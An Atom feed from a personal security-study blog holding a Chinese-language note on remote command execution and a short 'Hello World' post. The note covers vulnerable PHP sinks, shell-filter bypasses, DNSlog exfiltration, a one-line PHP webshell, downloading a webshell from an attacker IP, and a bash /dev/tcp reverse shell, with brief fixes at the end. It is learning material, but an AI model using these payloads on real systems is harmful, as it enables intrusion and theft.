<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mars1y</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-12-17T04:50:54.715Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Mars1y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RCE漏洞学习</title>
    <link href="http://example.com/2023/12/17/RCE/"/>
    <id>http://example.com/2023/12/17/RCE/</id>
    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-17T04:50:54.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​RCE，Remote Command&#x2F;Code Execute，远程命令&#x2F;代码执行。</p><h1 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h1><blockquote><p>注意，通过 url 传入命令时，拼接符需要进行 url 编码。</p></blockquote><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="命令1-命令2"><a href="#命令1-命令2" class="headerlink" title="命令1 || 命令2"></a>命令1 || 命令2</h3><p>​命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。</p><h3 id="命令1-命令2-1"><a href="#命令1-命令2-1" class="headerlink" title="命令1 | 命令2"></a>命令1 | 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-2"><a href="#命令1-命令2-2" class="headerlink" title="命令1 &amp;&amp; 命令2"></a>命令1 &amp;&amp; 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-3"><a href="#命令1-命令2-3" class="headerlink" title="命令1 &amp; 命令2"></a>命令1 &amp; 命令2</h3><p>​命令 1、2 一起执行，互不影响。</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="命令1-命令2-4"><a href="#命令1-命令2-4" class="headerlink" title="命令1 ; 命令2"></a>命令1 ; 命令2</h3><p>​命令 1、2 依次执行，互不影响。</p><h3 id="命令1-命令2-5"><a href="#命令1-命令2-5" class="headerlink" title="命令1 | 命令2"></a>命令1 | 命令2</h3><p>​管道符，命令 1 的执行结果做为命令 2 的输入。</p><p>​命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-6"><a href="#命令1-命令2-6" class="headerlink" title="命令1 || 命令2"></a>命令1 || 命令2</h3><p>​命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。</p><h3 id="命令1-命令2-7"><a href="#命令1-命令2-7" class="headerlink" title="命令1 &amp;&amp; 命令2"></a>命令1 &amp;&amp; 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>​把字符串按照 PHP 代码来执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">phpinfo</span>()); <span class="comment">//可以</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">phpinfo</span>();); <span class="comment">//报错</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phpinfo();&quot;</span>); <span class="comment">//可以</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phpinfo()&quot;</span>); <span class="comment">//报错</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号必须有</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>); <span class="comment">//此处及其他类似这样的变量用法，PHP会自动在变量的替代内容外包裹引号</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>​如果是字符串将会被当作 PHP 代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">phpinfo</span>()); <span class="comment">//可以</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">phpinfo</span>();); <span class="comment">//报错</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;phpinfo()&quot;</span>); <span class="comment">//可以</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;phpinfo();&quot;</span>); <span class="comment">//可以</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br></pre></td></tr></table></figure><p>​执行一个正则表达式的搜索和替换。</p><p>​$pattern 为正则表达式，$subject 为目标字符串，将匹配到的部分用 $replacement 替换。</p><p>​当 $pattern 处出现 <code>/e</code> 修正符，$replacement 会被当作 PHP 代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>], <span class="string">&quot;jutst test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(函数a, xxx)</span><br></pre></td></tr></table></figure><p>​调用函数 a ，xxx 为函数a 的参数。</p><p>​经测试，只有 assert 可以，eval 不行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(assert, <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="system-和-passthru"><a href="#system-和-passthru" class="headerlink" title="system() 和 passthru()"></a>system() 和 passthru()</h3><p>​执行操作系统命令，仅当执行成功时输出执行结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system/<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;命令&quot;</span>); <span class="comment">//标准写法</span></span><br><span class="line">system/<span class="title function_ invoke__">passthru</span>(命令); <span class="comment">//可以，但会抛出错误</span></span><br><span class="line">(system/passthru)(<span class="string">&quot;命令&quot;</span>); <span class="comment">//可以，但会抛出错误</span></span><br><span class="line">(system/passthru)(命令); <span class="comment">//可以，但会抛出错误</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=ver 不要在命令两边加引号，否则无法执行</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">system/<span class="title function_ invoke__">passthru</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>​执行操作系统命令，但不会输出任何内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;命令&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>​执行操作系统命令，返回执行结果，但不会输出。</p><p>​可使用 <code>echo shell_exec(&quot;命令&quot;);</code> 将执行结果输出。</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><blockquote><p>Windows 会把 echo 后的东西原封不动输出。</p><p>下面的内容仅针对 Linux 。</p></blockquote><h2 id="通用绕过方式"><a href="#通用绕过方式" class="headerlink" title="通用绕过方式"></a>通用绕过方式</h2><h3 id="加引号"><a href="#加引号" class="headerlink" title="加引号"></a>加引号</h3><p>​单、双引号均可，如 <code>who&#39;&#39;ami</code> 。</p><p>​引号内为空，系统会忽略引号。</p><h3 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h3><p>​&#x2F; 表示路径，\ 表示转义符。如果 \ 后面跟的是没有转义意义的字符，则会忽略 \ 。</p><blockquote><p>以下几种过滤情况都可以尝试通用绕过方式。</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>​可用 $IFS 替代空格。</p><p>​注意，对于 <code>echo 12$IFS34 </code> ，输出 <code>12</code> 而不是 <code>12 34</code>，因为系统会认为 $ 后面的都是变量名，而前面又没定义变量，所以不会输出任何东西，怎么办呢？</p><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>​<code>echo 12$IFS&quot;&quot;34</code> ，引号会截断变量名。</p><h3 id="局部变量法"><a href="#局部变量法" class="headerlink" title="局部变量法"></a>局部变量法</h3><p>​<code>a=34;echo 12$IFS$a</code></p><h3 id="大括号绕过"><a href="#大括号绕过" class="headerlink" title="大括号绕过"></a>大括号绕过</h3><p>​<code>echo 12$&#123;IFS&#125;34</code> ，限定变量范围。</p><h3 id="添加内置变量"><a href="#添加内置变量" class="headerlink" title="添加内置变量"></a>添加内置变量</h3><p>​<code>echo 12$IFS$134</code>，<code>$1</code>~&#96;$9<code>、</code>$@<code>、</code>$*&#96; 都是内置变量，可截断变量名。</p><h3 id="和-绕过"><a href="#和-绕过" class="headerlink" title="&lt;&gt; 和 &lt; 绕过"></a>&lt;&gt; 和 &lt; 绕过</h3><p>​&lt;&gt; 和 &lt; 可替代空格。</p><h2 id="过滤命令"><a href="#过滤命令" class="headerlink" title="过滤命令"></a>过滤命令</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 命令|<span class="built_in">base64</span>  <span class="comment">#输出命令进行base64加密后的密文</span></span><br><span class="line"><span class="built_in">echo</span> 加密后的命令|<span class="built_in">base64</span> -d|bash  <span class="comment">#先解密命令，再输出命令由bash执行的结果</span></span><br><span class="line"><span class="built_in">echo</span>$IFS<span class="variable">$1</span>加密后的命令|<span class="built_in">base64</span>$IFS<span class="variable">$1</span>-d|bash  <span class="comment">#同时过滤了空格时</span></span><br></pre></td></tr></table></figure><h4 id="hex-16进制"><a href="#hex-16进制" class="headerlink" title="hex 16进制"></a>hex 16进制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0x加密后的命令|xxd -r -p|bash <span class="comment">#先解密命令，再输出命令由bash执行的结果</span></span><br><span class="line"><span class="comment">#或 </span></span><br><span class="line"><span class="comment">#已知16进制编码下l为6c，s为73</span></span><br><span class="line">(<span class="built_in">printf</span> <span class="string">&quot;\x6c\x73&quot;</span>) <span class="comment">#输出ls的执行结果</span></span><br></pre></td></tr></table></figure><h4 id="oct-8进制"><a href="#oct-8进制" class="headerlink" title="oct 8进制"></a>oct 8进制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#已知 (printf ls) 或 (echo ls) 为输出ls的执行结果</span></span><br><span class="line"><span class="comment">#8进制编码下l为154，s为163</span></span><br><span class="line">(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>) <span class="comment">#输出ls的执行结果</span></span><br></pre></td></tr></table></figure><h3 id="局部变量绕过"><a href="#局部变量绕过" class="headerlink" title="局部变量绕过"></a>局部变量绕过</h3><p>​将命令拆分为多个变量，通过输入变量名的方式绕过。</p><p>​<code>cat flag.txt</code> ，可拆解为 <code>a=c;b=a;c=t;d=.txt;e=ag;f=fl;$a$b$c$IFS$f$e$d</code> 。</p><h3 id="和-绕过-1"><a href="#和-绕过-1" class="headerlink" title="[] 和 {} 绕过"></a>[] 和 {} 绕过</h3><p>​类似正则匹配，[] 匹配其内一个字符，{} 匹配其内所有字符，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> f[l,s]ag.txt <span class="comment">#或cat f[a-z]ag.txt</span></span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> f&#123;l,s&#125;ag.txt</span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;</span><br><span class="line"><span class="built_in">cat</span>: fsag.txt: 没有那个文件或目录</span><br></pre></td></tr></table></figure><h3 id="内置变量绕过"><a href="#内置变量绕过" class="headerlink" title="内置变量绕过"></a>内置变量绕过</h3><p>​内置变量如上述，<code>cat flag.txt</code> 可添加为如 <code>c$1a$2t flag.txt </code> 。</p><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><h4 id="跨行"><a href="#跨行" class="headerlink" title="跨行"></a>跨行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> \</span><br><span class="line">&gt; f\</span><br><span class="line">&gt; lag\</span><br><span class="line">&gt; .txt</span><br><span class="line">flag is here!</span><br></pre></td></tr></table></figure><h4 id="单行"><a href="#单行" class="headerlink" title="单行"></a>单行</h4><p>​<code>c\a\t flag.txt</code></p><h3 id="使用绝对路径加载命令"><a href="#使用绝对路径加载命令" class="headerlink" title="使用绝对路径加载命令"></a>使用绝对路径加载命令</h3><p>​<code>/bin/cat flag.txt</code></p><h3 id="命令代替绕过"><a href="#命令代替绕过" class="headerlink" title="命令代替绕过"></a>命令代替绕过</h3><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>​more、head、tail、rev、nl、sort、uniq、od</p><p>​hexdump -b file：以 8 进制显示文件内容。</p><p>​xxd file：以 16 进制显示文件内容。</p><p>​file -f file：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file -f flag.txt</span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;: cannot open <span class="string">&#x27;flag&#123;this_1s_f1@9&#125;&#x27;</span> (No such file or directory)</span><br></pre></td></tr></table></figure><p>​awk NR file：效果跟 <code>cat file</code> 一样。</p><h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p>​dir</p><h2 id="过滤flag关键字"><a href="#过滤flag关键字" class="headerlink" title="过滤flag关键字"></a>过滤flag关键字</h2><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>​<code>cat ????.???</code> </p><p>​<code>cat /f*</code></p><h3 id="字符串反序绕过"><a href="#字符串反序绕过" class="headerlink" title="字符串反序绕过"></a>字符串反序绕过</h3><p>​<code>cat flag.txt</code> 的反序为 <code>txt.galf tac</code> ，配合 rev 命令使其正序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt.galf <span class="built_in">tac</span>|rev|bash</span><br></pre></td></tr></table></figure><h3 id="字符串截取绕过"><a href="#字符串截取绕过" class="headerlink" title="字符串截取绕过"></a>字符串截取绕过</h3><p>​假设 ls 的执行结果为 flag.txt ，则可构造 <code>cat $(expr substr $(ls) 1 8)</code> 。</p><h3 id="和-绕过-2"><a href="#和-绕过-2" class="headerlink" title="&#96;&#96; 和 $() 绕过"></a>&#96;&#96; 和 $() 绕过</h3><p>​如果 ls 的结果为 flag.txt，则可 cat `ls&#96; 或 cat $(ls) ，还可 ls|xargs cat 。</p><blockquote><p>xargs：进行标准输出格式转换。</p><p><code>ls|xargs cat</code>：通过管道符获取 ls 命令的标准输出，再通过 xargs 命令对标准输出格式化为 cat 命令的参数。</p></blockquote><h2 id="命令无回显"><a href="#命令无回显" class="headerlink" title="命令无回显"></a>命令无回显</h2><h3 id="延时"><a href="#延时" class="headerlink" title="延时"></a>延时</h3><p>​Linux 下结合 sleep 命令。</p><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><p>​攻击机执行 <code>nc -lvp 7777</code> 开启监听，目标机执行 <code>curl ip:7777</code> 发出 HTTP 请求，如果攻击机收到请求则说明命令有执行。</p><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><blockquote><p>域名级别：</p><p>一级域名是互联网上的最高级别的域名。它是域名中最右边的部分，例如 “.com”、”.org”、”.net” 。一级域名是由顶级域名注册机构（例如 Verisign、Public Interest Registry 等）进行管理和分配的。</p><p>二级域名是一级域名下面的一个级别。它位于一级域名的左边，是一个有独立含义的名称。例如，在 “example.com” 中，”example” 是二级域名。</p><p>三级域名是在二级域名下再划分的一个级别。它位于二级域名的左边，是更加具体的子域名。例如，在 “blog.example.com” 中，”blog” 是三级域名。</p><p>域名的层级结构可以继续扩展，例如四级域名、五级域名，以此类推。每个级别的域名都可以有自己的独立设置和管理，用于指向不同的网络资源或服务。</p></blockquote><p>​如果 HTTP 请求的目标不是 IP 地址而是域名，则需要调用域名解析服务（DNS）将域名转换为 IP 地址。</p><p>​DNSlog，域名解析服务日志。在 ping 或 curl 一个域名时，就会调用域名解析服务。请求类似 DNSlog.cn 这些带有 DNSlog 的站点里的域名时，可以在这些站点里查看 DNSlog 。 </p><h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h3><h4 id="DNSlog-1"><a href="#DNSlog-1" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>​如 curl `whoami&#96;.xxx.dnslog.cn 。</p><h4 id="内容迁移"><a href="#内容迁移" class="headerlink" title="内容迁移"></a>内容迁移</h4><p>​将 flag.php 的内容迁移到浏览器可直接访问的文件中。</p><ul><li><code>cp flag.php 1.txt</code> → <code>localhost/1.txt</code> </li><li><code>mv flag.php flag.txt</code> → <code>localhost/flag.txt</code></li><li><code>tar cvf flag.tar flag.php</code> → <code>localhost/flag.tar</code></li><li><code>tar zcvf flag.tar.gz flag.php</code> → <code>localhost/flag.tar.gz</code></li><li><code>zip flag.zip flag.php</code> → <code>localhost/flag.zip</code></li></ul><h3 id="直接写入-webshell"><a href="#直接写入-webshell" class="headerlink" title="直接写入 webshell"></a>直接写入 webshell</h3><p>​传入 <code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt; webshell.php</code> ，然后对 webshell.php 进程操控。</p><h3 id="外部下载-webshell"><a href="#外部下载-webshell" class="headerlink" title="外部下载 webshell"></a>外部下载 webshell</h3><p>​传入 <code>wget 攻击机ip -O webshell.php </code> ，下载攻击机上的 webshell.php 到目标机上。</p><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><ol><li><p>攻击机监听端口：<code>nc -lvp 777</code> 。</p></li><li><p>目标机上执行命令：<code>bash -i &gt;&amp; /dev/tcp/攻击机ip/777 0&gt;&amp;1</code> 。接下来在目标机上执行的所有命令的结果都将被重定向到 <code>/dev/tcp/攻击机ip/777</code> 指定的攻击机上。</p><blockquote><ul><li><code>bash</code>：用于启动 Bash Shell 。</li><li><code>-i</code>：<code>bash</code> 命令的选项，表示以交互模式运行。这将使得 Shell 在连接建立后保持交互状态，可以接收输入和输出。</li><li><code>&gt;&amp;</code>：重定向符号，用于将输出重定向到某个地方。</li><li><code>/dev/tcp/攻击机ip/777</code>：这是一个特殊的文件路径，用于指定要重定向到的目标地址和端口。在这里，<code>/dev/tcp</code> 是一个虚拟文件系统，<code>攻击机ip</code> 是攻击机的 IP 地址，<code>777</code> 是要连接的目标端口号。</li><li><code>0&gt;&amp;1</code>：另一个重定向符号，表示将输入重定向到与输出相同的位置。</li></ul></blockquote></li></ol><h2 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h2><p>​异或绕过、或绕过、取反绕过、自增绕过。</p><p>​对传入参数进行上述操作后再传入。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li>在执行相关函数前，对传入的变量值做好过滤，对敏感字符进行转义。</li><li>不能完全控制的危险函数最好不要使用。</li><li>进行权限控制，如文件读写权限、目录访问权限。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;​		RCE，Remote Command&amp;#x2F;Code Execute，远程命令&amp;#x2F;代码执行。&lt;/p&gt;
&lt;h1 id=&quot;命令</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/12/10/HelloWorld/"/>
    <id>http://example.com/2023/12/10/HelloWorld/</id>
    <published>2023-12-09T16:00:00.000Z</published>
    <updated>2023-12-17T04:33:36.540Z</updated>
    
    <content type="html"><![CDATA[<p>​Hello, World!</p><p>​这是我的第一篇博客，从今天开始就一起探索未知的世界吧！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		Hello, World!&lt;/p&gt;
&lt;p&gt;​		这是我的第一篇博客，从今天开始就一起探索未知的世界吧！&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
